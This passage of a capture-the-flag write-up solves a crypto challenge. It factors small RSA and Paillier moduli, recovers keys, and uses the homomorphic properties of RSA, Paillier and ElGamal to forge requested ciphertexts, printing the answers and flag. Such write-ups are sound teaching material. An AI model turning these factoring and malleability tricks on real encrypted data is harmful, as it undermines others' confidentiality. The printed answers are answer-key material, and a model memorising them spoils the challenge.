<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; p = 864367132729</div><div class="line">&gt;&gt;&gt; q = 762848712947</div><div class="line">&gt;&gt;&gt; n = p * q</div><div class="line">&gt;&gt;&gt; e = 65537</div><div class="line">&gt;&gt;&gt; d = modinv(e, (p-1)*(q-1))</div><div class="line">&gt;&gt;&gt; a = pow(554863447144015806910906, d, n)</div><div class="line">&gt;&gt;&gt; a</div><div class="line">218624962707346537869456L</div><div class="line">&gt;&gt;&gt; pow(a**5 + 2*a + 41, e, n)</div><div class="line">215275919603710085695724L</div></pre></td></tr></table></figure>
<p>We have our second answer correct.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">n = 659381354716006369742363</div><div class="line">e = 65537</div><div class="line">enc(a) = 554863447144015806910906</div><div class="line">enc(a^5 + 2*a + 41)?</div><div class="line">215275919603710085695724</div><div class="line">Correct! Next...</div><div class="line">n = 776738987646974637425039</div><div class="line">g = 776738987646974637425040</div><div class="line">enc(a) = 104466234975614190334351556746005105225005455760</div><div class="line">enc(a^5)?</div></pre></td></tr></table></figure>
<p>Now, this looks like Paillier cryptosystem. We used yafu to discover n = p * q. We obtain p = 952658582963 and q = 815338256053.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; p = 952658582963</div><div class="line">&gt;&gt;&gt; q = 815338256053</div><div class="line">&gt;&gt;&gt; n = p * q</div><div class="line">&gt;&gt;&gt; g = 776738987646974637425040</div><div class="line">&gt;&gt;&gt; enc = 104466234975614190334351556746005105225005455760</div><div class="line">&gt;&gt;&gt; phi = (p-1)*(q-1)</div><div class="line">&gt;&gt;&gt; miu = modinv((pow(g, phi, n**2)-1)/n, n)</div><div class="line"># decrypt and find a</div><div class="line">&gt;&gt;&gt; z = pow(enc, phi, n**2)</div><div class="line">&gt;&gt;&gt; z = (z - 1)/n</div><div class="line">&gt;&gt;&gt; a = z*miu % n</div><div class="line">&gt;&gt;&gt; a</div><div class="line">593865001407021231568482L</div><div class="line"># encrypt a^5</div><div class="line">&gt;&gt;&gt; r = 5  #whatever number</div><div class="line">&gt;&gt;&gt; (pow(g, a**5, n**2) * pow(r, n, n**2)) % (n**2)</div><div class="line">551344609697032782258820295222867131320370770770L</div></pre></td></tr></table></figure>
<p>Correct. Next we find again ElGamal.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">n = 776738987646974637425039</div><div class="line">g = 776738987646974637425040</div><div class="line">enc(a) = 104466234975614190334351556746005105225005455760</div><div class="line">enc(a^5)?</div><div class="line">551344609697032782258820295222867131320370770770</div><div class="line">Correct! Next...</div><div class="line">q = 162468360679141142763506469479039044723348598131343445023537528281758038856725899813448600764965664562827243890486154155054547681581530078506256454819062823302171522262160978639320056038295558351438333626355253455829930861656788077110705347484186791527605530619097928023950578487542852122604132414043739150119</div><div class="line">g = 71617122044994067303905663362038925673552248437100144808168324877801061768171815833721974961532703253044394601768959631644002378569370957141698573753120813269172546820898334296643254497348710964283337196775523365259211998702039022625622498418357561295233596431521761773785941196196533383471457791068304542860</div><div class="line">h = 111066648693171887028924716387930536202901514118903026147266454463707523131763918297711469710662207420385870870164685517351171893585068487655691524361140991885848958718360460992751593253073812391597394918180851967495018510187596343611325247877606623904208279091478507563768905318293335621925954116646006910388</div><div class="line">enc(a) = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)</div><div class="line">enc(a^7)?</div></pre></td></tr></table></figure>
<p>This one is easy. The ElGamal encryption of a is the following.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">E(a) = (g^r mod q, a * h^r mod q)</div></pre></td></tr></table></figure>
<p>To obtain the encryption of a^7, we elevate E(a) to the power of 7.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">E(a)^7 = ((g^r mod q)^7, (a * h^r mod q)^7) = (g^(7r) mod q, a^7 * h^(7r) mod q) = E(a^7)</div></pre></td></tr></table></figure>
<p>Therefore:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">define q, h, g</div><div class="line">...</div><div class="line">&gt;&gt;&gt; enc = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)</div><div class="line">&gt;&gt;&gt; (pow(enc[0], 7, q), pow(enc[1], 7, q))</div><div class="line">(111943704492198613677284064414263835827314903408795497288196730523366749172531261312939368180540744924661825776170153157857298436145855968660805139686412343878802804331392369688765040244903208295888020856843171734022924414044150587927040617364297225555547079482268117880403242431146502775006475807941590243957, 146944962972196061304452302982428886923580067615704091332968984386866821167820106942309825648793805501664148988040753726356825992452196561280275962919553230491290426455421904803150216668843887712124953140424115672066452860798980586595286092420270643236030879120858647424877506090672990669173730588282484181475)</div></pre></td></tr></table></figure>
<p>Correct. The next one is another RSA with the following parameters.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">n = 116129573369269565162236051660667188158855673329540427297390499575862981989835841843866583577063083766954029063144621040623764875768299287457499920694511048949688694670794953791035923764107936680805021705444041635396218234076099965276137996734996446529395542124683260815237555361324912425749295153953132095761</div><div class="line">e = 65537</div><div class="line">enc(a) = 113404819639317667150945206046179254025822100958261129257002960505190359188994098567188808686386964857225447271200495440587539103432162087685650112552863460383570740714408941280241382042752738643406032354358166194009200674868816147437559543328518217678994594982357470461665835857915008170677398859755267093420</div><div class="line">enc((31*a)^7)?</div></pre></td></tr></table></figure>
<p>RSA is homomorphic to the multiplication and powers. Just do the following.</p>
<ol>
<li>Encrypt 31.</li>
<li>Multiply the encryption of 31 to the encryption of a. (z = E(31) * E(a) % n)</li>
<li>Power it. (result = pow(z, 7, n))</li>
<li>Done. result is 79422070142774248998696748364536969928051026241019028333521995212847190464228596819898318295431833653185507986566295081274239311469462993984644730127173443271940560058698451295020485382667406426759092058704807263661852917928725084340240033097368645878075171977767675641790645116925564507723204703462264972052</li>
</ol>
<p>Next. Another Paillier.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">n = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654023</div><div class="line">g = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654024</div><div class="line">enc(a) = 7937660128690175325568344972823559278861468103813145508603245376730524355646304917359508580566100608589042820651231838238609822717639617861887063282742304194177278580800908754694218555803321746479637321316698926171902620676195782762387943008573984077258721183694556844093549693467565523559928218327284235089</div><div class="line">enc(b) = 33387753148071257428905539518160221978694704069687353836469091655010096223312256529016397591008817430414577588510555623557614906758093969392417915817764626568693773437705685363505728318306424617495507184665856273528630405473435911817059436953757079883134497707484413544554359132244534862297762773379557525426</div><div class="line">enc(31*a + 12*b + 56)?</div></pre></td></tr></table></figure>
<p>Pallier is homomorphic to the addition and the multiplication, in the following way:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">E(m1)^k = E(k*m1)</div><div class="line">E(m1)E(m2) = E(m1 + m2)</div></pre></td></tr></table></figure>
<p>The result is:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(pow(E(a),31,n**2) * pow(E(b), 12, n**2)) * E(56) % n**2 = 4970421455367244845374713137266537502697958490590659650451726192347671487410827360664416249739491204023927184480151500339026488270807023596092868579949981952165240250817692006905532570205653975588657894036033054920661457321178863796257037956921744588997061459597410104137746663293674207917309975395301044061</div></pre></td></tr></table></figure></p>
<p>Finally, the flag is given to us:<br>CTF-BR{ASym3tric_partially_Homomorphic_3ncryPt1on}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Asymmetric Encryption&lt;br&gt;Bloodsuckers use different asymmetric encryption algorithms to send messages to their partners. You
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="rsa" scheme="https://teamrocketist.github.io/tags/rsa/"/>
    
      <category term="elgamal" scheme="https://teamrocketist.github.io/tags/elgamal/"/>
    
      <category term="pallier" scheme="https://teamrocketist.github.io/tags/pallier/"/>
    
      <category term="discrete log" scheme="https://teamrocketist.github.io/tags/discrete-log/"/>
    
  </entry>
  
</feed>
